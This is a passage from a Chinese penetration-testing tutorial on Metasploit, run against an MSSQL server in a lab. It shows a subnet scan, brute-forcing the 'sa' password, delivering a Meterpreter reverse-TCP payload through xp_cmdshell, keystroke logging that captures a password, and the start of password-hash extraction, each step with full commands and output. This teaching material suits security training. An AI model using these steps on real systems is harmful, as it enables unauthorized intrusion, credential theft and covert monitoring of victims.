### 6.1 MSSQL渗透测试

#### 6.1.1 使用mssql_ping模块扫描MSSQL服务器

通过`scanner/mssql/mssql_ping`命令调用`mssql_ping`模块并设置参数，可以扫描指定范围内的MSSQL服务器。以下是示例操作：

```bash
msf auxiliary(mssql_ping)> set RHOSTS 192.168.33.1/24
RHOSTS => 192.168.33.1/24
msf auxiliary(mssql_ping)> set THREADS 20
THREADS => 20
msf auxiliary(mssql_ping)> exploit
[*] Scanned 040 of 256 hosts (015% complete)
[*] Scanned 052 of 256 hosts (020% complete)
[*] Scanned 080 of 256 hosts (031% complete)
[*] Scanned 115 of 256 hosts (044% complete)
[*] SQL Server information for 192.168.33.130:
    - ServerName: IHAZSECURITY
    - InstanceName: SQLEXPRESS
    - IsClustered: No
    - Version: 9.00.1399.06 (SQL Server 2005)
    - TCP Port: 1433
```

从扫描结果可以看到，SQL服务器安装在`192.168.33.130`上，服务器名为`IHAZSECURITY`，版本号为`9.00.1399.06`（SQL Server 2005），监听端口为`1433`。

#### 6.1.2 暴力破解MSSQL服务器

接下来，使用Metasploit框架的`mssql_login`模块进行暴力破解：

```bash
msf > use scanner/mssql/mssql_login
msf auxiliary(mssql_login) > show options
Module options:
    Name              Current Setting  Required  Description
    ----              ---------------  --------  -----------
    BRUTEFORCE_SPEED  5               yes       How fast to bruteforce, from 0 to 5
    PASSWORD          no              no        The password for the specified username
    PASS_FILE         no              no        File containing passwords, one per line
    RHOSTS            yes             yes       The target address range or CIDR identifier
    RPORT             1433            yes       The target port
    THREADS           1               yes       The number of concurrent threads
    USERNAME          sa              no        The username to authenticate as
    USERPASS_FILE     no              no        File containing users and passwords separated by space, one pair per line
    USER_FILE         no              no        File containing usernames, one per line
    VERBOSE           true            yes       Whether to print output for all attempts

msf auxiliary(mssql_login) > set PASS_FILE /pentest/exploits/fasttrack/bin/dict/wordlist.txt
PASS_FILE => /pentest/exploits/fasttrack/bin/dict/wordlist.txt
msf auxiliary(mssql_login) > set RHOSTS 192.168.33.130
RHOSTS => 192.168.33.130
msf auxiliary(mssql_login) > set THREADS 10
THREADS => 10
msf auxiliary(mssql_login) > set VERBOSE false
VERBOSE => false
msf auxiliary(mssql_login) > exploit
[+] 192.168.33.130:1433 - MSSQL - successful login 'sa': 'password123'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

通过使用Fast-Track中的密码列表，成功猜解出了`sa`用户的密码：`password123`。

#### 6.1.3 利用xp_cmdshell执行命令

以`sa`管理员账户权限运行MS SQL时，可以执行`xp_cmdshell`存储过程，该存储过程允许与底层操作系统进行交互并执行命令。`xp_cmdshell`是SQL Server中默认加载的内置存储程序，可以通过MSSQL调用`xp_cmdshell`直接执行操作系统命令。

为了在系统中注入攻击载荷，我们需要与`xp_cmdshell`进行交互，添加本地管理员，并通过一个可执行文件来植入攻击载荷。David Kennedy和Joshua Drake（iduck）已经编写了一个模块（`mssql_payload`），可以通过`xp_cmdshell`植入任意Metasploit攻击载荷：

```bash
msf> use windows/mssql/mssql_payload
msf exploit(mssql_payload) > show options
Module options:
    Name          Current Setting  Required  Description
    ----          ---------------  --------  -----------
    PASSWORD      no              no        The password for the specified username
    RHOST         yes             yes       The target address
    RPORT         1433            yes       The target port
    USERNAME      sa              no        The username to authenticate as
    UseCmdStager  true            no        Wait for user input before returning from exploit
    VERBOSE       false           no        Enable verbose output

Exploit target:
    Id  Name
    --  ----
    0   Automatic

msf exploit(mssql_payload) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(mssql_payload) > set LHOST 192.168.33.129
LHOST => 192.168.33.129
msf exploit(mssql_payload) > set LPORT 443
LPORT => 443
msf exploit(mssql_payload) > set RHOST 192.168.33.130
RHOST => 192.168.33.130
msf exploit(mssql_payload) > set PASSWORD password123
PASSWORD => password123
msf exploit(mssql_payload) > exploit
[*] Started reverse handler on 192.168.33.129:443
[*] Command Stager progress - 2.78% done (1494/53679 bytes)
[*] Command Stager progress - 8.35% done (4482/53679 bytes)
[*] Sending stage (748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:443 -> 192.168.33.130:1699)
meterpreter>
```

选择`mssql_payload`模块后，设置我们的攻击载荷为`meterpreter`，在启动Meterpreter会话之前配置标准参数。执行`exploit`之后，Meterpreter会话在目标机上成功开启。

#### 6.1.4 Meterpreter基本命令

成功入侵系统并获得系统的Meterpreter会话之后，可以利用一些基本的Meterpreter命令来收集更多信息。以下是一些常用的命令：

1. **截屏**
   ```bash
   meterpreter> screenshot
   Screenshot saved to: /opt/metasploit3/msf3/yVHXaZar.jpeg
   ```
   截屏是获取目标系统信息的一个重要途径。例如，可以看到安装运行了McAfee。

2. **sysinfo**
   ```bash
   meterpreter> sysinfo
   Computer: IHAZSECURITY
   OS: Windows XP (Build 2600, Service Pack 2)
   Arch: x86
   Language: en_US
   ```
   可以看到，操作系统是Windows XP Service Pack 2，这意味着系统存在许多漏洞。

#### 6.1.5 获取键盘记录

为了获取系统的密码，可以使用键盘记录功能。首先，使用`ps`命令获取目标系统正在运行的进程：

```bash
meterpreter> ps
Process list
PID   Name                    Arch  Session  User
---   ----                    ----  -------  ----
...
1668  explorer.exe            x86   0        IHAZSECURITY\Administrator
...

meterpreter> migrate 1668
[*] Migrating to 1668...
[*] Migration completed successfully.
meterpreter> run post/windows/capture/keylog_recorder
[*] Executing module against V-MAC-XP
[*] Starting the keystroke sniffer...
[*] Keystrokes being saved into /root/.msf3/loot/20110324171334_default_192.168.1.195_host.windows.key_179703.txt
[*] Recording keystrokes...
[*] Saving last few keystrokes...
root@bt:~# cat /root/.msf3/loot/20110324171334_default_192.168.1.195_host.windows.key_179703.txt
Keystroke log started at Thu Mar 24 17:13:34 -0600 2011
administratorpasswordpassword123!!
```

执行`ps`命令获得了包括`explorer.exe`在内的进程列表。使用`migrate`命令将会话迁移至`explorer.exe`的进程空间中，之后启动`keylog_recorder`模块。一段时间后使用`CTRL-C`中止，最后，在另一个终端里，可以看到我们使用键盘记录所捕捉到的内容。

### 6.2 挖掘用户名和密码

#### 6.2.1 提取密码哈希值

本次攻击使用Meterpreter中的`hashdump`输入模块，来提取系统的用户名和密码哈希值。例如，在LM存储方式中，当用户首次输入密码或更改密码的时候，密码被转换为哈希值。由于哈希长度的限制，将密码切分为7个字符一组的哈希值。以`password123456`的密码为例，它会被切分为两部分进行哈希处理。